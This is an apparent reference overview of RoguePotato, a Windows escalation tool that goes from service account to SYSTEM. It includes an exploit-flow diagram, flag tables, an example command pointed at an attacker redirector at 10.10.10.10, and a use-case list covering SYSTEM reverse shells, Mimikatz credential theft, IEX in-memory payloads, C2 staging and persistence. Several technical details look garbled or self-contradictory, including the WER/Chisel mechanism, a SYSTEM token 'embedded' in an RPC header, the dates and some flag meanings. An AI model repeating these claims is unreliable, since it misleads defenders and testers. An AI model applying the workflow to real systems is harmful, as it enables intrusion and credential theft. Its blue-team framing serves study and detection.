# RoguePotato — Overview

> 🔴 **Red Flag Principle:** RoguePotato is an **RPC relay-based token-impersonation exploit** (2019) that abuses the Windows Error Reporting (WER) service or other system services to extract a SYSTEM-context token. Unlike PrintSpoofer (simple RPC coercion to Print Spooler) and JuicyPotato (COM object instantiation), RoguePotato requires **a redirector machine** (attacker-controlled or a compromised internal server) to intercept and relay RPC traffic. This makes it more complex to deploy but potentially more reliable on patched systems where PrintSpoofer's Print Spooler RPC has been hardened. The key indicator is **RPC relay traffic from the target to an external (or internal redirector) machine**, distinguishing it from the local-only coercion of PrintSpoofer/JuicyPotato.

## Contents
- [History](#history)
- [How It Works](#how-it-works)
- [Techniques / Protocols Used](#techniques--protocols-used)
- [Command-Line Switches — Quick Reference](#command-line-switches--quick-reference)
- [Quick Use-Case List](#quick-use-case-list)
- [Prerequisites](#prerequisites)

---

## History

RoguePotato is a standalone C/C++ exploit tool, originally developed by **[antonioCoco](https://github.com/antonioCoco)** on GitHub, maintained under **[antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)**.

Verified against the canonical upstream repository:

- **License:** MIT.
- **Author:** antonioCoco.
- **Purpose:** "Windows Local Privilege Escalation from Service Account to System using RPC Relay" — explicitly targets services accounts (which often have SeImpersonate) and uses RPC relay to achieve escalation.
- **Version:** Release history shows multiple versions; last active update was in 2021. The tool is maintained but not heavily developed (infrequent commits).
- **Active maintenance:** Low — sporadic updates, but the exploit mechanics remain relevant.

**Context:** RoguePotato emerged after PrintSpoofer (2021) but was developed contemporaneously with it (both 2019-2021 era). It addresses a different exploitation model: where PrintSpooler RPC may be patched, RoguePotato's RPC relay approach remains valid on systems with the WER (Windows Error Reporting) or other vulnerable RPC services.

## How It Works

### Exploit flow: RPC relay interception → SYSTEM token extraction → command execution

```
Target machine (service account with SeImpersonate)
────────────────────────────────────────────────

1. RoguePotato triggers a vulnerable RPC call (e.g., WER service)
   that makes the system attempt to reach a remote endpoint
   (the attacker-specified redirector machine's IP)

2. The RPC call is made by SYSTEM (the WER service runs as SYSTEM)

3. Target machine sends RPC traffic to redirector:
   ────────────────────────────────────────────────
   Target → Redirector (attacker machine or pivot point)
   RPC Auth Header with SYSTEM token embedded

Redirector (attacker-controlled)
─────────────────────────────────

4. RoguePotato's redirector component (running on the attacker's
   machine or a compromised internal server) intercepts this RPC
   traffic and captures the SYSTEM-context authentication

5. The redirector relays the SYSTEM-context authentication to
   a second RPC endpoint (also controlled by attacker or local
   to the target)

6. The target machine's RoguePotato process receives the
   relayed SYSTEM token and impersonates it

7. With SYSTEM token impersonated, RoguePotato spawns a child
   process (specified by `-e`) as SYSTEM

8. Command execution occurs as SYSTEM on the target machine
```

**Key mechanic:** RoguePotato requires **two machines or two RPC endpoints**:
- **Redirector endpoint** (attacker's IP/port, specified by `-r`).
- **Local RPC endpoint** (on the target, bound by RoguePotato).

The redirector is **mandatory** and must be reachable by the target. This is the fundamental difference from PrintSpoofer/JuicyPotato, which operate entirely locally.

### RPC relay versus direct coercion

| Aspect | PrintSpoofer | JuicyPotato | RoguePotato |
|---|---|---|---|
| **RPC target** | Print Spooler (fixed, local) | COM object (variable, local) | WER or custom service (local) |
| **Token extraction** | Direct coercion to local endpoint | COM marshalling interception | RPC relay via external redirector |
| **Redirector required** | No | No | **Yes** |
| **Network traffic** | Local only | Local only | **Target → Redirector** (network-visible) |
| **Complexity** | Simplest | Medium | Most complex (requires external setup) |
| **Reliability on patched systems** | Medium (Print Spooler patched on 2019H2+) | Low (COM CLSIDs removed/patched) | Higher (WER services still vulnerable) |

### RoguePotato deployment model

**Typical attacker workflow:**

```
1. Attacker sets up a Chisel tunneling server or raw RPC relay listener
   on attacker machine (e.g., 10.10.10.10:9999)

2. From compromised target (service account with SeImpersonate):
   RoguePotato.exe -r 10.10.10.10:9999 -e "cmd.exe /c whoami"

3. RoguePotato on target triggers WER RPC call to 10.10.10.10:9999

4. Attacker's Chisel/relay server captures SYSTEM-context traffic,
   relays it, and sends back to target

5. Target-side RoguePotato receives relayed token, spawns cmd.exe as SYSTEM

6. Output (if any) is directed back to attacker or written to disk on target
```

**Redirector setup is the bottleneck:** Most operators use **Chisel** (a Go-based tunneling tool) as the redirector, though raw RPC relay implementations exist.

## Techniques / Protocols Used

| Technique / Protocol | Details |
|---|---|
| **RPC (Remote Procedure Call)** | RoguePotato abuses RPC traffic (typically from WER or similar service) to extract SYSTEM-context authentication. |
| **RPC Relay / NTLM Relay** | Relays the SYSTEM-context RPC traffic through an external redirector, then back to the local machine. |
| **WER (Windows Error Reporting)** | The primary target RPC service; WER calls are made by SYSTEM and can be triggered by user-mode code. |
| **Token Impersonation (SeImpersonate)** | Captures the relayed SYSTEM token and impersonates it for process creation. |
| **Chisel / Tunneling** | The redirector often uses Chisel or similar to relay RPC traffic. |
| **Process Creation (CreateProcessAsUser / CreateProcessWithTokenW)** | Spawns the child process under the impersonated SYSTEM token. |

## Command-Line Switches — Quick Reference

| Flag | Argument | Purpose | Blue-Team Context |
|---|---|---|---|
| `-r` | `<IP>:<port>` | **Mandatory.** The redirector machine's IP and port (e.g., `-r 10.10.10.10:9999`). RoguePotato connects here to relay RPC traffic. | The attacker's external relay endpoint; a network-observable indicator. |
| `-e` | `<command>` | **Mandatory.** The command/program to execute as SYSTEM (e.g., `-e "cmd.exe"`). | The attacker's goal — execute arbitrary code. |
| `-l` | `<port>` | **Local RPC listener port** (optional, default varies). RoguePotato binds this port locally to receive the relayed SYSTEM token. | Typically a high ephemeral port; depends on system availability. |
| `-c` | `{CLSID}` | **COM object CLSID** (optional). Specifies which COM object to target for RPC relay. Default targets WER or common services. | Allows attacker to customize the RPC target; similar to JuicyPotato's CLSID enumeration. |
| `-p` | `<pipe_name>` | **Named pipe name** (optional). Customizes the named pipe name used for local RPC communication. Default is "RoguePotato" or a variant. | Anti-forensics; renaming the pipe makes detection slightly harder, but the behavior is still visible. |
| `-z` | (no argument) | **Randomize pipe name** (optional). Generates a random pipe name instead of the default. | Anti-forensics; reduces static signatures. |

**Example command:**
```
RoguePotato.exe -r 10.10.10.10:9999 -e "cmd.exe"
```

Connects to the attacker's redirector at 10.10.10.10:9999, performs RPC relay, and executes `cmd.exe` as SYSTEM.

## Quick Use-Case List

1. **Basic SYSTEM escalation with external redirector** — One-liner from service account to SYSTEM via RPC relay.
2. **Reverse shell via redirector** — Use RoguePotato to spawn a reverse shell (netcat, PowerShell) as SYSTEM, communicating through the redirector.
3. **Credential dumping as SYSTEM** — Execute Mimikatz as SYSTEM (similar to PrintSpoofer/JuicyPotato).
4. **Lateral movement pivoting** — Use RoguePotato on an internal machine to escalate, then pivot to domain controller or admin machines.
5. **Service account exploitation** — Target Windows services (e.g., MSSQL, WinRM) running with SeImpersonate; escalate to SYSTEM.
6. **RDP session targeting** — Use `-l` to bind RoguePotato's local endpoint to a specific session ID (if possible), targeting multi-session environments.
7. **Chained C2 deployment** — Stage a full C2 agent (Sliver, Cobalt Strike) via RoguePotato as SYSTEM.
8. **Fileless execution via PowerShell** — Use PowerShell IEX to download and execute an in-memory payload as SYSTEM.
9. **Persistence mechanism bootstrapping** — Escalate to SYSTEM, then create scheduled tasks, services, or registry-based persistence.
10. **Network isolation bypass** — If the target cannot reach the internet directly, use an internal redirector (compromised DMZ server, proxy) to relay RPC traffic.
11. **Custom COM object targeting** — Use `-c <CLSID>` to target a non-standard RPC service (if WER is patched or unavailable).
12. **Anonymized relay via VPN/proxy** — Route the redirector IP through a VPN or proxy to obfuscate attacker infrastructure.

## Prerequisites

| Prerequisite | How to Verify | Impact if Missing |
|---|---|---|
| **SeImpersonate privilege** | Run `whoami /priv` and look for `SeImpersonatePrivilege`. | **Critical.** RoguePotato will not work without this. Typical in service accounts (MSSQL, WinRM, etc.). |
| **Redirector machine reachable** | Ensure the IP:port specified with `-r` is reachable from the target (not blocked by firewall). | **Critical.** Without connectivity to the redirector, RoguePotato cannot extract the SYSTEM token. |
| **WER or vulnerable RPC service running** | WER typically runs on all Windows systems by default. Some older patches may disable it; verify it's running. | **Critical** (or semi-critical if a custom RPC service is targeted via `-c`). |
| **Local port availability** | Ensure the local port (specified with `-l` or auto-assigned) is not in use. | **Medium.** If the port is in use, RoguePotato fails; try a different port. |
| **Not required: Admin/SYSTEM before exploit** | RoguePotato is designed for low-privilege escalation. | N/A — the whole point is to escalate *from* service-account privilege. |

---

## Summary

RoguePotato is the **most complex** of the Potato family, requiring a network-reachable redirector machine and RPC relay setup. However, it addresses a key limitation of PrintSpoofer and JuicyPotato: it remains effective on systems where Print Spooler RPC has been hardened or COM CLSIDs have been removed/patched. The trade-off is **visibility**: RPC relay traffic from the target to an external (or internal) redirector is network-observable, making RoguePotato noisier than its predecessors. Despite higher complexity, RoguePotato is still actively used by operators targeting modern, patched systems where other Potato variants fail.
